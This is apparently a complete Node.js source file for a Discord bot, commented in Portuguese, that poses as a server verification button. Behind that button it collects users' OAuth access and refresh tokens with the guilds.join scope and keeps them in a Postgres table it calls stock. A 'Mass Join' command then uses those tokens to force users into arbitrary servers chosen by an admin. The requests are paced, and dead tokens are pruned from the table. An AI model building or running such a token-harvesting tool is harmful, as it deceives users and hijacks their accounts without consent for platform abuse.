require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Pool } = require('pg'); // Biblioteca do Postgres
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, PermissionsBitField, ActivityType 
} = require('discord.js');

// --- CONFIGURAÇÕES ---
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
const REDIRECT_TARGET = 'https://discord.com/app'; 

// --- CONEXÃO POSTGRES (NEON.TECH) ---
let pool = null;
if (process.env.DATABASE_URL) {
    pool = new Pool({
        connectionString: process.env.DATABASE_URL,
        ssl: { rejectUnauthorized: false } // Necessário para Neon/Render
    });
    console.log('✅ Conectado ao PostgreSQL!');
    
    // Cria a tabela automaticamente se não existir
    pool.query(`
        CREATE TABLE IF NOT EXISTS auth_users (
            id VARCHAR(255) PRIMARY KEY,
            username VARCHAR(255),
            access_token TEXT,
            refresh_token TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    `).catch(err => console.error("Erro ao criar tabela:", err));
} else {
    console.log('⚠️ DATABASE_URL não definida. Memória temporária.');
}

const app = express();
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// --- SISTEMA WEB ---
app.get('/', async (req, res) => {
    let count = 0;
    if(pool) {
        const result = await pool.query('SELECT COUNT(*) FROM auth_users');
        count = result.rows[0].count;
    }
    res.send(`Auth Bot Postgres Online. Estoque: ${count}`);
});

app.get('/callback', async (req, res) => {
    const { code, state } = req.query; 
    if (!code) return res.send('Erro: Falta código.');

    try {
        const tokenResponse = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                code,
                grant_type: 'authorization_code',
                redirect_uri: process.env.REDIRECT_URI,
                scope: 'identify guilds.join',
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );

        const { access_token, refresh_token } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` },
        });

        const user = userResponse.data;

        // --- SALVA NO POSTGRES (SQL) ---
        if (pool) {
            // "Upsert": Se existe atualiza, se não existe cria.
            await pool.query(`
                INSERT INTO auth_users (id, username, access_token, refresh_token)
                VALUES ($1, $2, $3, $4)
                ON CONFLICT (id) 
                DO UPDATE SET access_token = $3, refresh_token = $4;
            `, [user.id, user.username, access_token, refresh_token]);
        }

        // Tenta dar cargo
        let nomeServidor = "Desconhecido";
        if (state) {
            try {
                const guild = client.guilds.cache.get(state);
                if (guild) {
                    nomeServidor = guild.name;
                    const member = await guild.members.fetch(user.id).catch(() => null);
                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados');
                    if (member && role) await member.roles.add(role);
                }
            } catch (e) {}
        }

        // Log Discord
        const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
            const embed = new EmbedBuilder()
                .setTitle('📥 Token Salvo (SQL)')
                .setDescription(`**Usuário:** ${user.username}`)
                .setColor('Blue');
            logChannel.send({ embeds: [embed] });
        }

        res.send(`<!DOCTYPE html><html lang="pt-br"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verificado</title><style>body{background-color:#2b2d31;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}.card{background:#313338;padding:40px;border-radius:15px;text-align:center}.btn{background:#5865F2;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;margin-top:20px;display:inline-block}</style></head><body><div class="card"><h1>✅ Sucesso!</h1><p>Verificado em <b>${nomeServidor}</b>.</p><a href="${REDIRECT_TARGET}" class="btn">Voltar</a></div></body></html>`);

    } catch (e) { console.error(e); res.send('Erro auth.'); }
});
app.listen(process.env.PORT || 3000);

// --- BOT ---
client.once('ready', async () => {
    console.log(`🤖 Bot Postgres Logado: ${client.user.tag}`);
    
    await client.application.commands.set([
        { name: 'setup_auth', description: 'Painel Auth' },
        { name: 'estoque', description: 'Ver quantidade salva no banco' },
        { 
            name: 'enviar', 
            description: 'Mass Join (Do banco para o servidor)',
            options: [
                { name: 'quantidade', description: 'Quantos?', type: 4, required: true },
                { name: 'servidor_id', description: 'ID do destino', type: 3, required: true }
            ]
        }
    ]);
});

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    
    if (interaction.commandName === 'setup_auth') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅'));
        const embed = new EmbedBuilder().setTitle('🛡️ Verificação').setDescription('Clique abaixo para liberar seu acesso.').setColor('#5865F2');
        interaction.reply({ content: 'Painel enviado.', ephemeral: true });
        interaction.channel.send({ embeds: [embed], components: [row] });
    }

    if (interaction.commandName === 'estoque') {
        let count = 0;
        if(pool) {
            const res = await pool.query('SELECT COUNT(*) FROM auth_users');
            count = res.rows[0].count;
        }
        interaction.reply({ content: `📦 **Banco SQL:** ${count} usuários salvos.`, ephemeral: true });
    }

    if (interaction.commandName === 'enviar') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        if (!pool) return interaction.reply('❌ Sem conexão com o banco de dados.');

        const qtd = interaction.options.getInteger('quantidade');
        const serverId = interaction.options.getString('servidor_id');
        
        // Pega usuários do BANCO
        const res = await pool.query('SELECT * FROM auth_users LIMIT $1', [qtd]);
        const users = res.rows;
        
        if (users.length === 0) return interaction.reply({ content: '❌ Banco vazio.', ephemeral: true });

        await interaction.reply(`🚀 **Iniciando envio...**\nAlvo: \`${serverId}\`\nQtd: ${users.length}`);

        let sucesso = 0;
        let falha = 0;

        for (const user of users) {
            try {
                await axios.put(
                    `https://discord.com/api/guilds/${serverId}/members/${user.id}`,
                    { access_token: user.access_token }, // Note o underline (banco salva com _)
                    { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }
                );
                sucesso++;
            } catch (error) {
                // Se der erro 401 (Token inválido), deleta do banco
                if (error.response && error.response.status === 401) {
                    await pool.query('DELETE FROM auth_users WHERE id = $1', [user.id]);
                }
                falha++;
            }
            await sleep(1000);
        }

        interaction.channel.send(`✅ **Finalizado!**\nSucesso: ${sucesso}\nFalha: ${falha}`);
    }
});

client.login(process.env.BOT_TOKEN);
